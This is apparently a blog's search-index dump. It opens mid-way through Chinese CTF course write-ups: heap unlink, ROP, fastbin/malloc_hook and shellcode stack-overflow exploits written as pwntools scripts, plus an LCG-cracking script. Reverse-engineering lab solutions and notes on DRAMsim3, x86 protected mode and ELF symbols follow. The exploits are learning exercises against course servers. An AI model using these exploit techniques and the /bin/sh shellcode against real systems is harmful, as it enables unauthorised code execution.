note\\n\\t0.exit\") io.sendline('2') io.recvuntil(\"input the note index to delete:\") io.sendline(str(index))def exit(): io.recvuntil(\"Input your choice: \\n\\t1.edit note\\n\\t2.delete note\\n\\t0.exit\") io.sendline('0')# default as 144(0x90)# prevsize size# fd bkptr = 0x6020e0create(\"\", 0x0)create(\"\", 0x0)create(\"\", 0x0)create(\"\", 0x0)create(\"\", 0x0)create(\"\", 0x0)create(\"\", 0x0)start()# malloc似乎不会触发unlinkpayload = p64(0) + p64(0x90+1) + p64(ptr-0x18) + p64(ptr-0x10) + b'x'*(0x70) + p64(0x90) + p64(0xa0) # 似乎不需要伪造被unlink块的size和prevsize字段# payload = p64(ptr-0x18) + p64(ptr-0x10) + b'x'*(0x80) + p64(0xa0) + p64(0xa0) 这个的问题在于ptr处的指针没有指向unlink的块，所以会被检查出来，有必要填充前16个字节edit(0, payload)#gdb.attach(io)delete(1)payload = p32(500)*5edit(0, payload)exit()io.interactive()roprop基础题，程序存在seccomp，但open和read已经足够读取flag，直接构造rop调用这两个函数课上没做出来，用队友的wp填下坑ropfrom pwn import *context.log_level = \"debug\"p = process(\"./rop\")elf = ELF(\"./rop\")def gdb_a(addr): gdb.attach(p, \"b *{0} \\n c\".format(addr)) pause()p = remote(\"124.16.75.116\", 52017)# gdb_a(0x4013a7)p.recvuntil(\"your choice:\")p.sendline(str(0x1337))pop_rdi = 0x0000000000401503pop_rsi = 0x0000000000401501pop_rbp = 0x000000000040121d # : pop rbp ; retread = elf.plt[\"read\"]puts = elf.plt[\"puts\"]bss = 0x404100+0x100leave_ret = 0x00000000004012c7open_f = 0x4012C9addr = 0x401313test = 0x4012EFpl = b\"a\"*0x108pl += p64(pop_rdi) + p64(0)pl += p64(pop_rsi) + p64(bss) + p64(0)pl += p64(read)pl += p64(pop_rbp) + p64(bss)pl += p64(leave_ret) # mov rsp, rbp; pop rbp ret = pop ripp.send(pl)pl1 = b\"a\"*8pl1 += p64(pop_rsi) + p64(0) + p64(0)pl1 += p64(pop_rdi) + p64(bss+0x80)pl1 += p64(open_f)pl1 += p64(pop_rdi) + p64(0x3)pl1 += p64(pop_rsi) + p64(bss+0x100) + p64(0)pl1 += p64(read)pl1 += p64(pop_rdi) + p64(bss+0x100)pl1 += p64(puts)pl1 += b\"./flag\\x00\"p.sendline(pl1)p.interactive()升级赛faster程序存在UAF漏洞，可以构造fake fastbin。主要难点在于找到符合size检查的fake chunk，并且能控制执行流。主要思路为利用unsorted bin泄露libc基址，将fake chunk构造到malloc hook附近，修改malloc hook指向one gadget地址。unsorted bin会指向自身bins地址-0x10(32bit为0x8)的位置（以下称该地址为p）以保持双向循环链表结构。而这个指向的位置在malloc_state结构体的4+4+10*8=88偏移处。而在整个glibc中__malloc_trim获取了变量main_arena的地址，结合指针p的值和main_arena的地址可以推导出libc的加载基址之后直接把fastbin构造到malloc hook附近，把malloc_hook改成one gadget即可fasterfrom pwn import *libc = ELF('./libc-2.23.so')elf = ELF('./faster')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'def allocate(handle, size): handle.recvuntil('choice &lt;= ') handle.sendline('1') handle.recvuntil('input chunk size &lt;= ') handle.sendline(str(size))def free(handle, index): handle.recvuntil('choice &lt;= ') handle.sendline('2') handle.recvuntil('input chunk index &lt;= ') handle.sendline(str(index))def read(handle, index): handle.recvuntil('choice &lt;= ') handle.sendline('3') handle.recvuntil('input chunk index &lt;= ') handle.sendline(str(index)) def write(handle, index, buffer): handle.recvuntil('choice &lt;= ') handle.sendline('4') handle.recvuntil('input chunk index &lt;= ') handle.sendline(str(index)) handle.recvuntil('input data &lt;= ') handle.send(buffer)def run(handle): allocate(handle, 0x100) allocate(handle, 0x68) # get libc base then calculate all address we need free(handle, 0) # 0 read(handle, 0) # 1 handle.recvuntil('content:\\x0a') libc_addr = u64(handle.recv(6).ljust(8, b'\\x00')) libc_base = libc_addr - 0x3c4b20 - 88 libc.address = libc_base malloc_hook_addr = libc.sym['__malloc_hook'] #libc_base + libc.sym['__malloc_hook'] one_gadget_addr = libc_base + 0xf03a4 # 0x45226 0x4527a 0xf03a4 0xf1247 print(\"libc base: \", hex(libc_base)) print(\"malloc hook addr: \", hex(malloc_hook_addr)) print('one_gadget_addr: ', hex(one_gadget_addr)) allocate(handle, 0x68) # 2 free(handle, 2) write(handle, 2, p64(malloc_hook_addr - 0x23)) # fastbin -&gt; chunk 2 -&gt; malloc_hook_addr - 0x23 allocate(handle, 0x68) # 3 fastbin -&gt; malloc_hook_addr - 0x23 allocate(handle, 0x68) # 4 this ptr point to malloc_hook_addr - 0x23 write(handle, 4, b'\\x00'*0x13 + p64(one_gadget_addr)) # overwrite malloc hook with one gadget # trigger malloc which is replaced by one gadget allocate(handle, 0x68) handle.interactive()#io = remote(\"124.16.75.162\", 31011)p = process('./faster')run(p)月赛做了一道pwn和crypto，crypto是简单的同余问题就不写wp了pwnx简单的栈溢出并泄露栈地址，直接在栈上写一个短shellcode即可，这里参考博客里的shellcode需要注意printf没有换行符刷新缓冲区，需要让缓冲区达到4096上限自己刷新才能得到buf地址pwnx__int64 __fastcall main(int a1, char **a2, char **a3){ char buf[24]; // [rsp+0h] [rbp-20h] BYREF int v6; // [rsp+18h] [rbp-8h] int v7; // [rsp+1Ch] [rbp-4h] v7 = 1; while ( v7-- ) { printf(\"%p\", buf); v6 = read(0, buf, 0x30uLL); } return 0LL;}from pwn import *io = remote(\"124.16.75.162\", 31052)#p = process('./pwnx')elf = ELF('./pwnx')#libc = ELF('./libc-2.23.so.6')context.log_level = 'debug'context.os = 'linux'context.arch = 'amd64'#print(len(asm(shellcraft.sh())))def solve(handle): shellcode = b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\\x90' payload = shellcode + p32(0xdeadbeef) + p32(1) + p64(0xdeadbeef) + p64(0x4013e3) for i in range(292): print(i) handle.send(payload) stack_addr = int(handle.recv(14), 16) print(\"stack: {}\".format(hex(stack_addr))) payload = shellcode + p32(0xdeadbeef) + p32(0) + p64(0xdeadbeef) + p64(stack_addr) handle.send(payload) handle.interactive()solve(io)rand challengeimport libnumfrom pwn import *context.log_level = 'debug'context.os = 'linux'def solve(a, b, n, state): return ((state-b)*libnum.invmod(a, n))%nio = remote(\"124.16.75.162\", 31057)for i in range(50): print(\"{} times\".format(i)) io.recvuntil('a=') a = int(io.recvline()) io.recvuntil('b=') b = int(io.recvline()) io.recvuntil('N=') n = int(io.recvline()) io.recvuntil('num1=') state = int(io.recvline()) io.sendline(str(solve(a, b, n, state)))for i in range(30): print(\"{} times\".format(i)) io.recvuntil('a=') a = int(io.recvline()) io.recvuntil('N=') n = int(io.recvline()) io.recvuntil('num1=') num1 = int(io.recvline()) io.recvuntil('num2=') num2 = int(io.recvline()) b = (num2-num1*a)%n io.sendline(str(solve(a, b, n, num1)))for i in range(20): print(\"{} times\".format(i)) io.recvuntil('N=') n = int(io.recvline()) io.recvuntil('num1=') num1 = int(io.recvline()) io.recvuntil('num2=') num2 = int(io.recvline()) io.recvuntil('num3=') num3 = int(io.recvline()) a = (num3-num2)*libnum.invmod(num2-num1, n) b = (num2-num1*a)%n io.sendline(str(solve(a, b, n, num1)))io.recvuntil('num1=')num1 = int(io.recvline())io.recvuntil('num2=')num2 = int(io.recvline())io.recvuntil('num3=')num3 = int(io.recvline())io.recvuntil('num4=')num4 = int(io.recvline())io.recvuntil('num5=')num5 = int(io.recvline())list = [num1, num2, num3, num4, num5]#list.sort()n1 = (list[3]-list[2])*(list[3]-list[2])-(list[4]-list[3])*(list[2]-list[1])if n1 &lt; 0: n1 = -n1n2 = (list[2]-list[1])*(list[2]-list[1])-(list[3]-list[2])*(list[1]-list[0])if n2 &lt; 0: n2 = -n2n = libnum.gcd(n1, n2)print(n1, n2)print(n)a = (num3-num2)*libnum.invmod(num2-num1, n)b = (num2-num1*a)%nio.sendline(str(solve(a, b, n, num1)))io.interactive()" }, { "title": "高级网络攻防逆向", "url": "/posts/%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E9%80%86%E5%90%91/", "categories": "CTF, Exercise", "tags": "reverse", "date": "2023-03-10 12:15:00 +0800", "snippet": "课堂实验junkcode概要给定一个64位Linux平台上的可执行文件，输入为一个数字。请通过逆向分析，求解出符合要求的输入，打印出成功字样程序流程主要流程图该文件流程较为简洁，可以直接通过main函数进入程序的主要逻辑main流程图根据概要描述需要输入一个数字并得到成功字样，观察main函数的主要逻辑可以发现输入的数字存储在[rbp-0ch]处，并且作为参数传入encrypt函数，最终得到返回值eax。对于返回值eax，程序将其与0c3dah作比较，当结果相同时会进一步执行到0x1275处的call _printf指令，该指令会显示win字样，标志成功。所以可以判断需要调整输入值，使得encrypt结果等于0c3dah。encrypt流程图encrypt流程包含几次跳转，此处只讨论不会引起程序结束的分支流向。如图可见从0x11d6到0x11fd最终跳转到0x11eb处是不会引起程序退出的执行流。而在0x11eb处指令跳转到0x11ec处，与自身指令字节码重合，所以进行手动写入nop观察程序的进一步逻辑。patched encrypt流程图nop掉0x11eb处字节后重新整理指令编码后，观察到该处代码对输入值做了循环左移和异或两种操作，这两种操作的逆运算是循环右移和异或，至此程序的逻辑便清晰了。patched encrypt 伪代码观察伪代码可以获得完整的逻辑，只需要做相应逆运算即可分析结果执行结果对0xc3da做3次逆运算即可得到结果789asmasm概要题目给出一个汇编文件，会根据输入判断输出you win或you lose提示符程序流程 将4写入eax寄存器 将97写入edx寄存器 将eax寄存器值写入ecx寄存器(eax=4, ecx=4, edx=97) 将edx寄存器值算术左移cl(=4)位(eax=4, ecx=4, edx=1552) 将edx寄存器值写入eax寄存器(eax=1552, ecx=4, edx=1552) 将eax寄存器值算术左移3位(eax=12416, ecx=4, edx=1552) 将eax寄存器值加上edx寄存器值(eax=13968, ecx=4, edx=1552) 将eax寄存器值加上eax寄存器值(eax=27936, ecx=4, edx=1552) 将edx寄存器值加上eax寄存器值(eax=27936, ecx=4, edx=29488) 比较eax寄存器和变量a的值是否相等分析结果根据提示符，我们需要让eax寄存器的值和变量a相等，故a的值应该为29488即0x7330bitsbits概要程序会给用户一串数字并要求输入一个结果程序流程main函数流程程序通过ptrace和getid实现反调试，并从code文件中读取内容到ptr上作为随机种子。encode函数流程encode函数流程较为复杂，难以直接分析。但可以发现对输入数组a3的操作总是依据code中读取出来数组进行的，即对输入数组的操作与输入数组本身无关，那么便可以将所有操作记录下来并进行依次进行逆运算。分析结果std::stack&lt;std::function&lt;unsigned int(unsigned int)&gt;&gt; reverse_ops;for (...) { ... if (v12&amp;1) { res = res - (res&amp;7) - (res&amp;7) + 7; reverse_ops.push( [=](unsigned int x){ return x - 7 + 2*(7-x&amp;7); }); }}while (!reverse_ops.empty()) { auto op = reverse_ops.top(); need_to_decode = op(need_to_decode); reverse_ops.pop();}通过栈我们保存所有操作的逆运算，并最终通过逆序依次执行这些逆运算得到原始值。其中res ^= (((res&lt;&lt;16)^res)&gt;&gt;16) ^ (res&lt;&lt;16);和res = res - (res&amp;7) - (res&amp;7) + 7;的逆运算较难提取res ^= (((res&lt;&lt;16)^res)&gt;&gt;16) ^ (res&lt;&lt;16);最终效果是将数据高16位放于低16位，高16位与低16位异或值放于高16位，至此逆运算方法便一目了然res = res - (res&amp;7) - (res&amp;7) + 7;将结果res&amp;7便可以得到7-(原始res&amp;7)，经过简单运算后便可以得到完整的原始res完整脚本如下#include &lt;cstdlib&gt;#include &lt;stdio.h&gt;#include &lt;stack&gt;#include &lt;assert.h&gt;#include &lt;functional&gt;unsigned int encode_while_decode(unsigned int res, unsigned int need_to_decode) { FILE *stream = fopen(\"code\", \"rb\"); if (!stream) exit(0); fseek(stream, 0, 2); unsigned int size = ftell(stream); fseek(stream, 0, 0); unsigned char *ptr = (unsigned char *)malloc(size); if(fread(ptr, size, 1, stream) != 1) exit(0); std::stack&lt;std::function&lt;unsigned int(unsigned int)&gt;&gt; reverse_ops; unsigned int dword_202020[] = { 0x24DD20CF, 0x3E4F0354, 0x18B2E85F, 0x2F2CAFB8, 0x5810ADCB, 0x42F7FF85, 0x36E0D6C2, 0x5F3EF93F, 0x7F46E74A, 0x44DDC864, 0x64959795, 0x39413451, 0x5DC36C45, 0x62037E7E, 0x5AEA541F, 0x153F8FAC }; int v3, v4; unsigned char v7, v8, v9, v10, v11; char v12; unsigned int v13, v14, v15; int v16, v17; v17 = v16 = v15 = v14 = v13 = 0; while (!reverse_ops.empty()) reverse_ops.pop(); for (int i=0; i&lt;size; i++) { unsigned char v7 = *(ptr + i); if (v7 &amp; 1) { res ^= dword_202020[v13]; reverse_ops.push([=](unsigned int x){ return x^dword_202020[v13]; }); v13 = (v13+1) &amp; 0xf; } v8 = v7 &gt;&gt; 1; v3 = v8 &amp; 3; if (v3 == 2) { v15 = dword_202020[v13] &amp; 0xaabbccdd; v13 = (v13+1) &amp; 0xf; v9 = v8&gt;&gt;2; } else if (v3 == 3) { res += v14+v15; reverse_ops.push([=](unsigned int x){ return x - (v14+v15); }); v15 = 0; v14 = 0; v9 = v8&gt;&gt;2; } else { if (v3 == 1) { v14 = dword_202020[v13] | 0xabcdabcd; v13 = (v13+1) &amp; 0xf; } v9 = v8&gt;&gt;2; } if (v9 &amp; 1) { res = ~res; reverse_ops.push([=](unsigned int x){ return ~x; }); } v10 = v9&gt;&gt;1; if (v10 &amp; 1) { res ^= (((res&lt;&lt;16)^res)&gt;&gt;16) ^ (res&lt;&lt;16); reverse_ops.push([=](unsigned int x){ return (x&lt;&lt;16) | (((x&lt;&lt;16)^x) &gt;&gt; 16); }); } v11 = v10&gt;&gt;1; v4 = v11&amp;3; if (v4 == 2) { v17 = dword_202020[v13] - 539034144; v13 = (v13+1) &amp; 0xf; v12 = v11&gt;&gt;2; } else if (v4 == 3) { res += v16+v17; reverse_ops.push([=](unsigned int x){ return x - (v16+v17); }); v16 = 0; v17 = 0; v12 = v11&gt;&gt;2; } else { if (v4 == 1) { v16 = 539034132 * dword_202020[v13]; v13 = (v13+1)&amp;0xf; } v12 = v11 &gt;&gt; 2; } if (v12&amp;1) { res = res - (res&amp;7) - (res&amp;7) + 7; reverse_ops.push( [=](unsigned int x){ return x-7 + 2*(7-x&amp;7); }); } } while (!reverse_ops.empty()) { auto op = reverse_ops.top(); need_to_decode = op(need_to_decode); reverse_ops.pop(); } printf(\"reverse result: %d\\n\", need_to_decode); return res;}int main(int argc, char **argv) { unsigned int need_to_decode = atoi(argv[1]); encode_while_decode(0, need_to_decode);}mazemaze概要该程序为走迷宫游戏，从起点走到终点的步骤为flag程序流程main函数流程程序自己设置了.dataa和.bsss段，并在运行的时候解码这两个段之后进入主要逻辑game_entry处理在地图上移动的问题地图数据完整地图数据解码后可以找到地图数据存放的地址，如图为二进制内的数据和通过调整长宽后的地图s符号处理逻辑程序通过wasd四个键控制上左下右移动，以s为例，主要逻辑如图所示t符号处理逻辑程序通过t控制角色在地图上字符abcd间的传送分析结果解码和获取地图的idapython脚本如下def decode_dataa(): bsss_addr = 0x403000 bsss_end = 0x403400 key_addr = 0x406000 key_end = 0x406a00 xor_key = [103, 97, 109, 101, 95, 115, 116, 97, 114, 116] for i in range(key_end-key_addr): dataa = idc.get_wide_byte(i + key_addr) ida_bytes.patch_byte(i+key_addr, xor_key[i%10] ^ dataa)def decode_bsss(): bsss_addr = 0x403000 bsss_end = 0x403400 key_addr = 0x406010 key_end = 0x406a00 xor_key = [103, 97, 109, 101, 95, 115, 116, 97, 114, 116] for i in range(bsss_end-bsss_addr): bsss = idc.get_wide_byte(i + bsss_addr) dataa = idc.get_wide_byte(i%11 + key_addr) ida_bytes.patch_byte(i+bsss_addr, bsss ^ dataa)def show_map(): start_addr = 0x406020 end_addr = 0x406932 for i in range(end_addr - start_addr): print(chr(idc.get_wide_byte(i + start_addr)), end='') if (i+1)%86==0: print(\"\")执行结果通过走地图得到最终flag为dsdwdtdsawdsdwasdwdsasdtdsdwd" }, { "title": "DRAMsim3解析", "url": "/posts/DRAMsim3%E8%A7%A3%E6%9E%90/", "categories": "HardWare, Memory", "tags": "dram", "date": "2022-10-22 11:15:00 +0800", "snippet": "DRAMsim3因为任务变动就只看了一部分代码主要的架构，关于能耗和热量的具体代码没有详细看。HMC模块也没看，这个模块比较重要，和JeDec差异较大。整体架构其中Controller的时钟刷新较为关键，整理了下流程图。Controller clocktick资料 深入内存/主存：解剖DRAM存储器 DRAM的工作原理 DDR Memory工作原理 DRAM的架构历史和未来 Synthesis Lectures on Computer Architecture" }, { "title": "x86保护模式与内存管理", "url": "/posts/x86%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/", "categories": "Linux, Basic", "tags": "x86, memory, privilege, interrupt", "date": "2022-10-20 11:15:00 +0800", "snippet": "特权级intel CPU 一般有实模式、保护模式和长模式三种工作模式。其中保护模式的段选择子和段描述符使用特权级描述代码特权。x86 处理器将特权级分为4个级别，用两个比特位表示，其中0为最高特权级。基于以下原因大多数操作系统只使用0和3两个特权级 实用性：分页管理不需要细致的特权级。 可移植性：常规操作系统需要兼容其他架构，而大多数架构只实现了2个特权级。 效率：切换特权级本身就是有开销的，但是与之相应的收益却不大。大多数情况下 ring2 和 ring3 的安全情况一致，而ring1经常调用 ring0 不如直接放入 ring0。通常将特权分为DPL、CPL、RPL和IOPL四种，用来表示不同情景下的特权级。这里先作介绍，后面会结合场景使用。描述符特权级(Descriptor Privilege Level)DPL 表示段或门的特权级。存储在段描述符或者门描述符的 DPL 字段中。当前特权级(Current Privilege Level)CPL 是当前执行的程序或任务的特权级。存储在 CS 等段寄存器的第0位和第1位上。调整段寄存器段索引的同时会将描述符写入描述符高速缓存中。以 CS 段寄存器为例，通过 CS 对应描述符指向的基地址和 EIP 存储的偏移值计算指令地址。段寄存器请求特权级(Request Privilege Level)RPL 是通过段选择子的第0和第1位表现出来的。当 RPL &gt; DPL 的时候，RPL 才起到实际的限制作用。段选择子IO特权级(I/O Privilege Level)IOPL 是当前任务的I/O特权级别，存储在EFLAGS的第13位和第12位上。正在运行任务的 CPL 必须小于或等于 I/O 特权级才能允许访问 I/O 地址空间。这个域只能在 CPL 为0时才能通过 POPF 以及 IRET 指令修改。特权级检查 将控制直接转移到非一致性的代码段：jmp 0x0012:0x00002000，jmp转移后当前特权级不变。 CPL==目标代码段描述符的 DPL RPL==目标代码段描述符的 DPL 将控制直接转移到非一致性的代码段：call，call转移后改变特权级(CPL = DPL)，只有call指令可以将代码通过调用门转移到特权级更高的非一致性代码之中。 将控制直接转移到一致性的代码段，特权级不变。 CPL≥目标代码段描述符的 DPL RPL≥目标代码段描述符的 DPL 高特权级别的程序可以访问低特权级别的数据段，但低特权级别的程序不能访问高特权级别的数据段。访问数据段之前，肯定要对段寄存器 DS、ES、FS 和 GS 进行修改。例 mov fs,ax 在这个时候，要求当前特权级 CPL 和请求特权级 RPL 都必须高于，或者和目标数据段描述符的 DPL 相同。 CPL≤目标数据段描述符的 DPL RPL≤目标数据段描述符的 DPL 处理器要求，在任何时候，栈段的特权级别必须和当前特权级 CPL 相同。因此，要对段寄存器 ss 的内容进行修改时，必须进行特权级检查。例 mov ss,ax 在对段寄存器ss进行修改时，要求当前特权级 CPL 和请求特权级 RPL 必须等于目标栈段描述符的 DPL。 CPL==目标栈段描述符的 DPL RPL==目标栈段描述符的 DPL 描述符描述符通常使用在中断描述符表、全局描述符表和局部描述符表中作为基本单元，这里介绍描述符的基本结构。描述符结构上述描述符结构主要适用于段描述符、TSS 描述符和 LDT 描述符，常使用在GDT和LDT中，详细参数解释如下 符号 含义 G(Granularity) 段界限的单位量，G 为0时单位量为字节，G 为1时单位量为4K。 S(System) S 为1时是数据段或数据段，S 为0时是系统段，在 CPU 的世界里，系统段主要是指各种称为门的结构，如调用门和任务门；数据段主要是指操作系统及应用程序的代码、数据以及栈。 TYPE TYPE 用来表示段描述符的类型。 DPL 表示描述符特权级，特权级的数字越小，特权级越大。CPU 进入保护模式（操作系统的代码）默认为0。 P(Present) 用来标识段是否存在内存中，1表示存在。如果为0，CPU 将抛出异常，跳转到我们编写的异常处理程序，在处理完成以后，需要将该字段置为1。 AVL 对于操作系统来说，此位没有效果 L(Long Mode) L 为1表示64位代码段，否则表示32位代码段 D/B 用来指示有效地址（段内偏移地址）及操作数的大小。如果段是代码段，0表示指令中的有效地址地址和操作数是16位，指令地址使用 IP 寄存器，1代表指令中的有效地址和操作数是32位，指令有效地址用 EIP 寄存器；对于栈段来说，0使用的是 SP 寄存器，1使用的是 ESP 寄存器 系统段类型 系统段类型 11 10 9 8 LDT 0 0 1 0 TSS 1 0 0 1 忙碌的 TSS 1 0 1 1 可用的80286 TSS 0 0 0 1 忙碌的80286 TSS 0 0 1 1 任务门 0 1 0 1 调用门 1 1 0 0 中断门 1 1 1 0 陷阱门 1 1 1 1 80286调用门 0 1 0 0 80286中断门 0 1 1 0 80286陷阱门 0 1 1 1 非系统段类型非系统段可以分为代码段和数据段 X R C A 代码段描述 1 0 0 * 可执行 1 1 0 * 可执行+可读 1 0 1 * 可执行+一致性 1 1 1 * 可执行+可读+一致性 X W E A 数据段描述 0 0 0 * 只读 0 1 0 * 可读+可写 0 0 1 * 只读+向下扩展 0 1 1 * 可读+可写+向下扩展 一致性代码可以被低特权级用户直接调用，后面会详细说明。创建段时 A 位默认为0，当操作系统访问过后置1。E 位表示扩展方向，0向上，1向下，常见的栈段为向下。段描述符段描述符为最基本的描述符结构，存在于 GDT 和 LDT 中TSS描述符TSS 描述符采用了描述符基本结构。TSS 描述符仅可能存放在 GDT 中，不能存放在 LDT 或 IDT 中。x86 的构想是每一个任务对应一个 TSS，然后由TR寄存器指向当前的任务，执行任务切换时，修改TR寄存器的指向即可，这是硬件层面的多任务切换机制。包括 Linux 和 Windows 在内的主流操作系统都没有使用这个机制来进行线程切换，而是自己使用软件来实现多线程切换，但有时一些异常处理会使用到 TSS 来执行处理。TR 寄存器分为可见和不可见两部分，可见部分中的段选择符指向 GDT 中 TSS 描述符，不可见部分缓存TSS的描述符。当把任务状态段的选择子装入到 TR 可见部分时，处理器自动把选择子所索引的描述符中的段基地址等信息保存到不可见的高速缓冲寄存器中。更新 TR 顺序：GDT选择子==&gt;访问GDT==&gt;TSS描述符(根据TR段索引确定)==&gt;访问TSS(==&gt;加载到TR)；TSS 描述符所指向的 TSS 结构如下所示TSS结构TR 寄存器结构如下TRLDT描述符局部描述符表寄存器 LDTR 规定当前任务使用的局部描述符表 LDT。LDT 描述符仅存在于 GDT 中更新 LDTR 顺序：GDT选择子==&gt;访问GDT==&gt;LDT描述符(根据LDTR段索引确定)==&gt;访问LDT(==&gt;加载到LDTR)；LDTR 寄存器结构如下LDTR门描述符在上一节描述符中我们介绍了通用的描述符结构，但是对具体TYPE类型中的各门，该结构不再适用，这一节将分别介绍各门的描述符结构。门描述符通常为中断描述符表常用的基本单元，但需要注意有些门并不能使用在IDT中，而有些门不仅能使用在IDT中。任务门描述符(Task Gate)任务门需要和任务状态段(TSS)配合使用，这是Intel处理器在硬件一级提供的任务切换机制。任务门可以存在于GDT、LDT和IDT中。任务门描述符调用门描述符(Call Gate)调用门是用户进程用来进入0特权级的方式，其DPL为3，只能使用call和jmp指令调用。调用门可以存在于GDT和LDT中，不能存在于IDT调用门描述符中断门描述符(Interrupt Gate)中断门包含中断处理程序所在的段选择子和段内偏移地址，当通过此方式进入中断后，标志寄存器eflags中的IF位自动置0，表示把中断关闭，避免中断嵌套。中断们只存在于IDT中。中断门描述符陷阱门描述符(Trap Gate)通过陷阱门进入中断，标志寄存器eflags的IF位不会自动置0。陷阱门只存在于IDT中。陷阱门描述符描述符表中断描述符表(Interrupt Description Table)IDTR表示中断描述符表寄存器，用来寻找中断描述符表的位置。当发生中断时，通过中断向量索引中断描述符表，以8字节为步长。中断描述符表全局描述符表(Global Description Table)GDTR通过 GDTR 可以确定 GDT 的位置，通过 LDTR 可以确定 LDT 的位置，通过 IDTR 可以确定 IDT 的位置。综合前面所述，我们可以大致了解三个表的布局情况。通过中断向量搜索 IDT 表进而得到相应的门描述符进一步在 GDT 和 LDT 中搜索得到具体地址。通过选择子可以直接在 LDT 或 GDT 中搜索。保护模式结构中断系统中断本身的分类是复杂的，这里主要介绍x86的四大类中断 类别 原因 返回 中断 I/O设备 下一条指令 陷阱 异常，例如调试陷阱、单步中断指令 int3 和溢出检测指令 into。陷阱最重要的用途是在用户程序和内核之间提供系统调用接口。 下一条指令 故障 潜在可恢复错误，例如缺页故障 当前指令 终止 不可恢复错误，例如双重故障异常、协处理器段越界 不返回 门处理中断有些异常必须由中断门或陷阱门进行处理，如设备不可用故障(异常7)，该故障在下列情况下产生：(1)在执行浮点指令时，控制寄存器 CR0 中的 EM 位或 TS 位为1；(2)在执行 WAIT 指令时，控制寄存 器CR0 中 TS 位及 EM 位都为1。无效 TSS 异常必须使用任务门进行处理，以保证处理程序有一个有效得任务环境。其它的异常通常在任务环境之内进行处理。通过中断门访问的中断处理程序，必须置于全局地址空间中，以便对所有的任务都有效。在使用中断门时，中断处理程序通常必须被安排在特权级0。分页机制x86 分页机制通过 CR0 和 CR3 实现，为其初始化 PE+PG+页目录基址即可。控制寄存器组控制寄存器组我们主要关注CR0、CR2和CR3，并忽略一些不重要的位。CR0 PE：CR0 的第0位是启用保护(Protection Enable)标志。当设置该位时即开启了保护模式；当复位时即进入实地址模式。这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么PE和PG标志都要置位。 PG：CR0 的第31位是分页（Paging）标志。当设置该位时即开启了分页机制；当复位时则禁止分页机制，此时所有线性地址等同于物理地址。在开启这个标志之前必须已经或者同时开启PE标志。即若要启用分页机制，那么 PE 和 PG 标志都要置位。CR2是页故障线性地址寄存器，保存最后一次出现页故障(Page Fault)的全32位线性地址。在报告页异常时，处理器会把引起异常的线性地址存放在 CR2 中。因此操作系统中的页异常处理程序可以通过检查 CR2 的内容来确定线性地址空间中哪一个页面引发了异常。CR3 PCD：控制当前页目录表的缓冲，当设置清空时，缓冲置位时，缓冲无效，与 CR0 中的 CD 或 PG 一同使用 PWT：控制 cache 采取直写还是回写的策略，当设置清空时，回写有效，当置位时，直写有效现代操作系统分页机制前面介绍了很多段描述符相关的知识，但是现代操作系统主要是基于分页的，这种分段机制很鸡肋。所以通常操作系会直接将段设置为基地址为0，限长最大的情况。也就是说将代码段、数据段和栈段等直接整合在4GB的内存空间中，此时段机制基本也就没用了。一般称这种行为为平坦模式。参考 全局描述符表 中断描述符表 x86 - 特权级别 CPL / RPL / DPL / IOPL x86 - CPU架构/寄存器详解 （三） 保护模式 任务状态段TSS及TSS描述符、局部描述符表LDT及LDT描述符 操作系统篇-分段机制与GDT LDT x86 - 操作系统：中断、陷阱、异常、故障、终止 操作系统篇-调用门与特权级（CPL、DPL和RPL） 现代操作系统管理内存，到底是分段还是分页，段寄存器还有用吗？ IA-32 架构软件开发人员手册" }, { "title": "符号解析", "url": "/posts/%E7%AC%A6%E5%8F%B7%E8%A7%A3%E6%9E%90/", "categories": "Linux, Basic", "tags": "elf", "date": "2022-09-27 22:15:00 +0800", "snippet": " 结合源码分析符号和符号表在链接器的上下文中，可以定义三种不同的符号 当前模块定义并且能被其他模块引用的全局符号，包括函数和全局变量。 其他模块定义并且被当前模块引用的全局符号，也称为外部符号。 只被当前模块定义和引用的局部符号，包括带static属性的函数和全局变量。其他变量一般通过栈管理，不生成符号。但是，带static修饰的过程变量却会出现在.symtab中，并且经过一些名称处理。7: 00000004 4 OBJECT LOCAL DEFAULT 5 temp.1507符号表在ELF文件解析中介绍过了，这里提一下=下可重定位目标文件节的分配策略。 COMMON: 未初始化的全局变量 bss: 未初始化的静态变量，初始化为0的全局变量和静态变量extern int buf[];int *bufp0 = &amp;buf[0];int *bufp1;void swap(){ static int temp; bufp1 = &amp;buf[1]; temp = *bufp0; *bufp0 = *bufp1; *bufp1 = temp;} ... 6: 00000000 4 OBJECT LOCAL DEFAULT 5 temp.1507 ... 13: 00000000 4 OBJECT GLOBAL DEFAULT 6 bufp0 14: 00000000 0 NOTYPE GLOBAL DEFAULT UND buf 15: 00000004 4 OBJECT GLOBAL DEFAULT COM bufp1 16: 00000000 85 FUNC GLOBAL DEFAULT 2 swap 17: 00000000 0 FUNC GLOBAL HIDDEN 8 __x86.get_pc_thunk.ax 18: 00000000 0 NOTYPE GLOBAL DEFAULT UND _GLOBAL_OFFSET_TABLE_正常情况下swap位于.text，而初始化的bufp0位于.data。所以我们可以推理出6对应.data，2对应.text。符号冲突Linux下编译器向汇编器输出强符号和弱符号，而在汇编器生成的可重定位目标文件中COMMON节的未初始化全局变量便是弱符号，相应的初始化全局变量和函数是强符号。 不允许同名强符号 强符号和弱符号同名选择强符号 弱符号和弱符号同名任意选择符号冲突带来的意外可以通过GCC-fno-common或-Werror选项来避免。静态库符号解析将多个可重定位目标文件链接生成的可执行目标文件含有大量冗余信息。为此，静态库的概念诞生了。通过将多个可重定位目标文件封装在一个静态库内使得最后可执行目标文件只会包含引用到的模块。$ ar rcs libvector.a addvec.o multvec.o$ gcc -c main.c$ gcc -static -o main main.o -L. -lvector$ gcc -static -o main main.o ./libvector.a多文件链接时编译器会从左到右扫描，如果出现互相引用的情况测需要再次声明。具体的规则涉及到目标文件集合E、未解析符号集合U和已定义符号集合D。gcc foo.c libx.a liby.a libx.a重定位todo!()reference .symtab 《深入理解计算机系统》" }, { "title": "dl_runtime_resolve解析", "url": "/posts/dl_runtime_resolve%E8%A7%A3%E6%9E%90/", "categories": "Linux, Basic", "tags": "elf", 